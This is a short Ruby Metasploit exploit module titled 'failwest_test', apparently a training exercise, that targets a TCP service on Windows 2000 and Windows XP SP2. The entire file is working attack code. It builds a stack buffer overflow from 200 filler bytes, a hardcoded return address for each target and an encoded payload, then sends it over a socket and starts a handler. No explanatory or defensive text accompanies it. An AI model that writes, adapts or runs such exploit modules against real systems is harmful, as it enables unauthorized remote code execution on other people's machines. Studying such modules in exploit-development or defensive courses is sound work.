#! /usr/bin/env ruby
require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
    include Msf::Exploit::Remote::Tcp
    def initialize(info={})
        super(update_info(info,
            'Name' => 'failwest_test',
            'Platform' => 'win',
            'Targets' => [
                ['Windows 2000', {'Ret' => 0x77F8948B } ],
                ['Windows XP SP2',{'Ret' => 0x77d8625f } ]
                ],
            'Payload' => {
                'Space' => 200,
                'BadChars' => "\x00",
                }
            )
        )
    end    
    def exploit
        connect
        attack_buf = 'a'*200 + [target['Ret']].pack('V') + payload.
        encoded
        sock.put(attack_buf)
        handler
        disconnect
    end #end of exploit def
end